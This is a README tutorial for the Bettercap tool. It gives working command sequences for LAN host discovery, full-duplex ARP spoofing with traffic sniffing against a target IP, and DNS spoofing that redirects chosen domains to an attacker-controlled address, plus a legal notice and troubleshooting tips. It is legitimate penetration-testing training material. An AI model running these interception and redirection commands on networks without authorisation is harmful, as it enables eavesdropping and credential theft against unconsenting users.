# Bettercap - Quick Reference & Guide

A small, focused repository to help users get started with **Bettercap** for network discovery, ARP spoofing (MITM) and DNS spoofing. This README gives a clear, step-by-step workflow, explanations of commands, examples, safety guidance and troubleshooting tips.

---

## Table of contents

* [What is this repo for?](#what-is-this-repo-for)
* [Safety & Legal Notice](#safety--legal-notice)
* [Prerequisites](#prerequisites)
* [Installation](#installation)
* [Starting Bettercap](#starting-bettercap)
* [Network discovery (net.probe / net.show)](#network-discovery-netprobe--netshow)
* [ARP spoofing (man-in-the-middle)](#arp-spoofing-man-in-the-middle)
* [DNS spoofing](#dns-spoofing)
* [Example session](#example-session)
* [Tips & best practices](#tips--best-practices)
* [Troubleshooting](#troubleshooting)

---

## What is this repo for?

This repo provides a compact, user-friendly README to teach the core Bettercap commands and a recommended workflow for discovery, ARP spoofing, and DNS spoofing. It is aimed at learners and security testers who already understand ethical and legal constraints.

---

## Safety & Legal Notice

**Do not** run ARP/DNS spoofing, MITM, or any offensive network tests on networks or devices for which you do **not** have explicit permission. Misuse can be illegal and harmful.

If you are practicing on your own lab network, use isolated test environments (VMs, VLANs, or dedicated hardware).

---

## Prerequisites

* A Unix-like OS (Linux/macOS) or a compatible environment.
* Administrative/root privileges (many Bettercap features require `sudo`).
* Bettercap installed (version may affect command names/options).
* Basic knowledge of TCP/IP, ARP, DNS, and network interfaces.

---

## Installation

Commands below are common installation approaches. Confirm with your OS package manager and Bettercap docs.

**Debian/Ubuntu (example):**

```bash
sudo apt update
sudo apt install bettercap
# or install via gem or release binaries depending on your preference
```

---

## Starting Bettercap

Start the interactive Bettercap CLI:

```bash
sudo bettercap
```

Alternatively start against a specific network interface:

```bash
sudo bettercap -iface eth0
```

Replace `eth0` with your active interface name (e.g., `wlan0`, `enp3s0`).

---

## Network discovery (net.probe / net.show)

Discover devices on your LAN:

```
net.probe on
```

This probes the network to gather hosts.

Show discovered devices:

```
net.show
```

`net.show` lists IP, MAC, vendor and open ports (if probed). Use this output to pick targets for ARP or DNS spoofing.

---

## ARP spoofing (man-in-the-middle)

**Goal:** place your machine between a target device and the gateway (router) to inspect or manipulate traffic.

> Important flags and commands:

* `arp.spoof.fullduplex true` - attempt fullduplex to intercept both directions (target ↔ gateway).
* `arp.spoof.targets <IP>` - set the victim IP(s).
* `arp.spoof on` - enable ARP spoofing.
* `net.sniff on` - start sniffing intercepted traffic in real time.

**Example ARP spoofing sequence:**

```bash
# inside bettercap CLI
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.7
arp.spoof on
net.sniff on
```

**Explanations:**

* `arp.spoof.fullduplex true` tries to poison ARP tables for both the **target** and the **gateway**, making your host the MITM for traffic flowing either way.
* `arp.spoof.targets` can accept a single IP, a comma-separated list, or a netmask range depending on version.
* `net.sniff` captures packets; saved captures or live output depend on configuration.

**Stopping ARP spoofing:**

```bash
arp.spoof off
```

---

## DNS spoofing

Use DNS spoofing to redirect specific domains to an IP you control (use responsibly).

**Commands:**

```bash
set dns.spoof.address 10.0.0.123
set dns.spoof.domains example.com,login.example.net
dns.spoof on
```

**Explanation:**

* `dns.spoof.address <IP>` - the IP that spoofed DNS records should resolve to.
* `dns.spoof.domains <domain1,domain2,...>` - comma-separated domains to intercept and spoof.
* `dns.spoof on` - enables DNS spoofing module.

**Notes:**

* Bettercap may support wildcard or file-backed domain lists; check your version.
* Some client systems (HTTPS, certificate pinning, HSTS) will detect or prevent redirection -- DNS spoofing does not bypass TLS certificate checks.

---

## Example session

```bash
# start bettercap (with interface)
sudo bettercap -iface wlan0

# discovery
net.probe on
net.show

# choose a target (example IP 192.168.1.7)
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.7
arp.spoof on

# sniff traffic
net.sniff on

# optionally redirect a domain to your web server
set dns.spoof.address 192.168.1.50
set dns.spoof.domains example.com
dns.spoof on
```

---

## Tips & best practices

* Always confirm the network interface: `ip link` / `ifconfig`.
* Run Bettercap in a controlled test environment first.
* Use packet capture tools (tcpdump, Wireshark) alongside Bettercap for offline analysis.
* Keep Bettercap and system packages updated.
* Read Bettercap module documentation for advanced options (such as logging, scripting, cert tools).

---

## Troubleshooting

* **No hosts discovered:** Ensure `net.probe` completed and your interface is correct. Some networks block ARP scanning.
* **ARP spoof not effective:** Check kernel IP forwarding and firewall rules on your machine; ensure `sudo` privileges.
* **DNS spoof not redirecting:** Client may be using DNS over HTTPS (DoH) or DNS caching; check client DNS settings.
* **HTTPS errors at client:** TLS certificate checks will prevent transparent HTTPS hijacking; DNS spoofing alone will not forge certificates.

---

## Final notes

* This README is a compact learning resource - it intentionally focuses on core commands and workflows.
* Always confirm Bettercap version differences and consult the official Bettercap documentation for advanced configuration or changes in command syntax.
